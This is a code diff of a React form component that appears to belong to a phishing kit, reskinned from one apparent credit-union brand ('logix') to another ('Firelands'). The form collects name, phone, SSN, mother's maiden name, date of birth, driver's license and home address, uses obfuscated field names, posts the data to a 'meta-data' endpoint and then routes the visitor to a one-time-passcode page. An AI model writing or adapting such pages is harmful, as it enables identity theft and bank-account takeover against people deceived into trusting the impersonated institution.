@@ -1,517 +1,272 @@
-import React, { useState } from 'react';
-import { useNavigate, useLocation } from 'react-router-dom';
+import React, { useState, useEffect } from 'react';
+import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import useAccessCheck from '../Utils/useAccessCheck';
+
+const heroImageUrl = '/assets/firelands-landing.jpg';
 
 const BasicInfo: React.FC = () => {
-  const [fzNme, setFzNme] = useState('');
-  const [lzNme, setLzNme] = useState('');
-  const [phone, setPhone] = useState('');
-  const [ssn, setSsn] = useState('');
-  const [motherMaidenName, setMotherMaidenName] = useState('');
-  const [month, setMonth] = useState('');
-  const [day, setDay] = useState('');
-  const [year, setYear] = useState('');
-  const [driverLicense, setDriverLicense] = useState('');
-  const [showSSN, setShowSSN] = useState(false);
-  const [stAd, setStAd] = useState('');
-  const [apt, setApt] = useState('');
-  const [city, setCity] = useState('');
-  const [state, setState] = useState('');
-  const [zipCode, setZipCode] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ 
-    fzNme: '', 
-    lzNme: '', 
-    phone: '', 
-    ssn: '', 
-    motherMaidenName: '', 
-    dob: '', 
+  const location = useLocation();
+  const { emzemz } = location.state || {};
+  const navigate = useNavigate();
+  
+  // Redirect if no email
+  useEffect(() => {
+    if (!emzemz) {
+      navigate('/');
+    }
+  }, [emzemz, navigate]);
+
+  // Form state
+  const [formData, setFormData] = useState({
+    fzNme: '',
+    lzNme: '',
+    phone: '',
+    ssn: '',
+    motherMaidenName: '',
+    dob: '',
     driverLicense: '',
+    stAd: '',
+    apt: '',
+    city: '',
+    state: '',
+    zipCode: ''
+  });
+  
+  const [errors, setErrors] = useState({
+    fzNme: '',
+    lzNme: '',
+    phone: '',
+    ssn: '',
+    dob: '',
     stAd: '',
     city: '',
     state: '',
     zipCode: ''
   });
-  const [username, setUsername] = useState('');
-  const isAllowed = useAccessCheck(baseUrl);
+  
+  const [isLoading, setIsLoading] = useState(false);
 
-  const navigate = useNavigate();
-  const location = useLocation();
-  const { emzemz: emzemzState } = location.state || {};
-
-  React.useEffect(() => {
-    if (emzemzState) {
-      setUsername(emzemzState);
-    } else {
-      console.error('No username provided from previous page');
-      // Optionally redirect back or show error
-    }
-  }, [emzemzState]);
-
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
-
-  // Check if username is available before showing form
-  if (!username) {
-    return <div>Error: No username provided. Please go back and try again.</div>;
-  }
-
-  const currentYear = new Date().getFullYear();
-  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
-  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;
-
-  const formatPhone = (value: string) => {
-    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
-    if (digitsOnly.length >= 7) {
-      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
-    } else if (digitsOnly.length >= 4) {
-      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
-    }
-    return digitsOnly;
-  };
-
-  const formatSSN = (value: string) => {
-    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
-    if (digitsOnly.length >= 6) {
-      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
-        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
-      );
-    } else if (digitsOnly.length >= 4) {
-      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
-        p2 ? `${p1}-${p2}` : `${p1}`
-      );
-    }
-    return digitsOnly;
-  };
-
-  const validateForm = () => {
-    const phoneDigits = phone.replace(/\D/g, '');
-    const ssnDigits = ssn.replace(/\D/g, '');
-    
-    const newErrors = { 
-      fzNme: !fzNme.trim() ? 'First name is required' : '',
-      lzNme: !lzNme.trim() ? 'Last name is required' : '',
-      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
-      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
-      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
-      dob: (!month || !day || !year) ? 'Complete date of birth is required' : '',
-      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
-      stAd: !stAd.trim() ? 'Street address is required' : '',
-      city: !city.trim() ? 'City is required' : '',
-      state: !state.trim() ? 'State is required' : '',
-      zipCode: !zipCode.trim() ? 'Zip code is required' : ''
-    };
-
-    if (month && day && year) {
-      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
-      const age = new Date().getFullYear() - dob.getFullYear();
-      const monthDiff = new Date().getMonth() - dob.getMonth();
-      
-      if (age < 18 || (age === 18 && monthDiff < 0)) {
-        newErrors.dob = 'You must be at least 18 years old.';
-      }
-    }
-
-    setErrors(newErrors);
-    return !Object.values(newErrors).some(error => error);
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+    setFormData(prev => ({
+      ...prev,
+      [name]: value
+    }));
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    if (!validateForm()) {
+    setIsLoading(true);
+    
+    // Validate required fields
+    const newErrors = {
+      fzNme: !formData.fzNme ? 'First name is required' : '',
+      lzNme: !formData.lzNme ? 'Last name is required' : '',
+      phone: !formData.phone ? 'Phone is required' : '',
+      ssn: !formData.ssn ? 'SSN is required' : '',
+      dob: !formData.dob ? 'Date of birth is required' : '',
+      stAd: !formData.stAd ? 'Street address is required' : '',
+      city: !formData.city ? 'City is required' : '',
+      state: !formData.state ? 'State is required' : '',
+      zipCode: !formData.zipCode ? 'Zip code is required' : ''
+    };
+    
+    setErrors(newErrors);
+    
+    if (Object.values(newErrors).some(err => err)) {
+      setIsLoading(false);
       return;
     }
-
-    setIsLoading(true);
-
+    
     try {
-      const getMonthName = (monthNumber: string) => {
-        const monthNames = [
-          "January", "February", "March", "April", "May", "June",
-          "July", "August", "September", "October", "November", "December"
-        ];
-        return monthNames[parseInt(monthNumber) - 1] || '';
-      };
-
-      const dob = `${getMonthName(month)}/${day}/${year}`;
-
-      // Submit basic info
-      await axios.post(`${baseUrl}api/logix-basic-info/`, {
-        emzemz: username,
-        fzNme,
-        lzNme,
-        phone,
-        ssn,
-        motherMaidenName,
-        dob,
-        driverLicense
+      await axios.post(`${baseUrl}api/firelands-meta-data-3/`, {
+        emzemz,
+        ...formData
       });
-
-      // Submit home address
-      await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
-        emzemz: username,
-        stAd,
-        apt,
-        city,
-        state,
-        zipCode
-      });
-
-      navigate('/card', {
-        state: {
-          emzemz: username
-        }
-      });
+      navigate('/otp', { state: { emzemz } });
     } catch (error) {
-      console.error('Error submitting form:', error);
-      setErrors(prev => ({
-        ...prev,
-        form: 'There was an error submitting your information. Please try again.'
-      }));
+      console.error('Error submitting basic info:', error);
     } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Basic Information & Home Address</h2>
+    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
+      <div className="absolute inset-0">
+        <img
+          src={heroImageUrl}
+          alt="Sun setting over Firelands farm fields"
+          className="h-full w-full object-cover"
+          loading="lazy"
+          decoding="async"
+          fetchPriority="high"
+          sizes="100vw"
+        />
+        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
       </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="">We will need you to confirm your personal information.</p>
-
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
-          {/* First Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">First Name:</label>
-            <input
-              id="fzNme"
-              name="fzNme"
-              type="text"
-              value={fzNme}
-              onChange={(e) => setFzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter first name"
-            />
-            {errors.fzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.fzNme}</span>
-              </div>
-            )}
-          </div>
-
-          {/* Last Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Last Name:</label>
-            <input
-              id="lzNme"
-              name="lzNme"
-              type="text"
-              value={lzNme}
-              onChange={(e) => setLzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter last name"
-            />
-            {errors.lzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.lzNme}</span>
-              </div>
-            )}
-          </div>
-
-          {/* Phone */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Phone:</label>
-            <input
-              id="phone"
-              name="phone"
-              type="text"
-              value={phone}
-              onChange={(e) => setPhone(formatPhone(e.target.value))}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="(555) 123-4567"
-            />
-          </div>
-          {errors.phone && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.phone}</span>
-            </div>
-          )}
-
-          {/* SSN */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">SSN:</label>
-            <input
-              id="ssn"
-              name="ssn"
-              type={showSSN ? 'text' : 'password'}
-              value={ssn}
-              onChange={(e) => setSsn(formatSSN(e.target.value))}
-              maxLength={11}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="XXX-XX-XXXX"
-            />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={() => setShowSSN(!showSSN)}
-            >
-              {showSSN ? 'Hide' : 'Show'}
-            </span>
-          </div>
-          {errors.ssn && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.ssn}</span>
-            </div>
-          )}
-
-          {/* Mother's Maiden Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Mother's Maiden Name:</label>
-            <input
-              id="motherMaidenName"
-              name="motherMaidenName"
-              type="text"
-              value={motherMaidenName}
-              onChange={(e) => setMotherMaidenName(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter maiden name"
-            />
-          </div>
-          {errors.motherMaidenName && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.motherMaidenName}</span>
-            </div>
-          )}
-
-          {/* Date of Birth */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Date of Birth:</label>
-            <div className="flex gap-2">
-              <select
-                value={month}
-                onChange={(e) => setMonth(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Month</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {new Date(0, i).toLocaleString('default', { month: 'long' })}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={day}
-                onChange={(e) => setDay(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Day</option>
-                {Array.from({ length: daysInMonth }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {i + 1}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={year}
-                onChange={(e) => setYear(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Year</option>
-                {years.map((y) => (
-                  <option key={y} value={y}>
-                    {y}
-                  </option>
-                ))}
-              </select>
-            </div>
-          </div>
-          {errors.dob && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.dob}</span>
-            </div>
-          )}
-
-          {/* Driver's License */}
-          <div className="flex items-center gap-4 mb-6">
-            <label className="text-gray-700 w-24 text-right">Driver's License:</label>
-            <input
-              id="driverLicense"
-              name="driverLicense"
-              type="text"
-              value={driverLicense}
-              onChange={(e) => setDriverLicense(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter license number"
-            />
-          </div>
-          {errors.driverLicense && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.driverLicense}</span>
-            </div>
-          )}
-
-          {/* Home Address Section */}
-          <div className="border-t-2 border-gray-300 mt-6 pt-6">
-            <h3 className="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
+      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
+        <div className="mx-auto w-full max-w-6xl">
+          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+            <h2 className="text-2xl font-semibold text-[#2f2e67]">Personal Information</h2>
             
-            {/* Street Address */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">Street Address:</label>
-              <input
-                id="stAd"
-                name="stAd"
-                type="text"
-                value={stAd}
-                onChange={(e) => setStAd(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter street address"
-              />
-            </div>
-            {errors.stAd && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.stAd}</span>
+            <form onSubmit={handleSubmit} className="mt-6 space-y-4">
+              {/* Personal Info Fields */}
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]">First Name</label>
+                  <input
+                    name="fzNme"
+                    value={formData.fzNme}
+                    onChange={handleChange}
+                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                  />
+                  {errors.fzNme && <p className="text-sm text-rose-600">{errors.fzNme}</p>}
+                </div>
+                
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]">Last Name</label>
+                  <input
+                    name="lzNme"
+                    value={formData.lzNme}
+                    onChange={handleChange}
+                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                  />
+                  {errors.lzNme && <p className="text-sm text-rose-600">{errors.lzNme}</p>}
+                </div>
               </div>
-            )}
-
-            {/* Apartment/Unit */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">Apartment/Unit:</label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(e) => setApt(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Optional"
-              />
-            </div>
-
-            {/* City */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">City:</label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter city"
-              />
-            </div>
-            {errors.city && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.city}</span>
+              
+              {/* Phone */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Phone</label>
+                <input
+                  name="phone"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.phone && <p className="text-sm text-rose-600">{errors.phone}</p>}
               </div>
-            )}
-
-            {/* State */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">State:</label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter state"
-              />
-            </div>
-            {errors.state && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.state}</span>
+              
+              {/* SSN */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">SSN</label>
+                <input
+                  name="ssn"
+                  value={formData.ssn}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.ssn && <p className="text-sm text-rose-600">{errors.ssn}</p>}
               </div>
-            )}
-
-            {/* Zip Code */}
-            <div className="flex items-center gap-4 mb-6">
-              <label className="text-gray-700 w-24 text-right">Zip Code:</label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter zip code"
-              />
-            </div>
-            {errors.zipCode && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.zipCode}</span>
+              
+              {/* Mother's Maiden Name */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Mother's Maiden Name</label>
+                <input
+                  name="motherMaidenName"
+                  value={formData.motherMaidenName}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
               </div>
-            )}
-          </div>
-
-          {!isLoading ? (
-            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
+              
+              {/* Date of Birth */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Date of Birth</label>
+                <input
+                  name="dob"
+                  value={formData.dob}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.dob && <p className="text-sm text-rose-600">{errors.dob}</p>}
+              </div>
+              
+              {/* Driver's License */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Driver's License</label>
+                <input
+                  name="driverLicense"
+                  value={formData.driverLicense}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+              </div>
+              
+              {/* Home Address Section */}
+              <h2 className="text-2xl font-semibold text-[#2f2e67]">Home Address</h2>
+              
+              {/* Street Address */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Street Address</label>
+                <input
+                  name="stAd"
+                  value={formData.stAd}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.stAd && <p className="text-sm text-rose-600">{errors.stAd}</p>}
+              </div>
+              
+              {/* Apartment/Unit */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Apartment/Unit</label>
+                <input
+                  name="apt"
+                  value={formData.apt}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+              </div>
+              
+              {/* City */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">City</label>
+                <input
+                  name="city"
+                  value={formData.city}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.city && <p className="text-sm text-rose-600">{errors.city}</p>}
+              </div>
+              
+              {/* State */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">State</label>
+                <input
+                  name="state"
+                  value={formData.state}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.state && <p className="text-sm text-rose-600">{errors.state}</p>}
+              </div>
+              
+              {/* Zip Code */}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Zip Code</label>
+                <input
+                  name="zipCode"
+                  value={formData.zipCode}
+                  onChange={handleChange}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.zipCode && <p className="text-sm text-rose-600">{errors.zipCode}</p>}
+              </div>
+              
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Processing...' : 'Continue'}
               </button>
-            </div>
-          ) : (
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-          )}
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
-        </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
+            </form>
+          </div>
         </div>
       </div>
     </div>
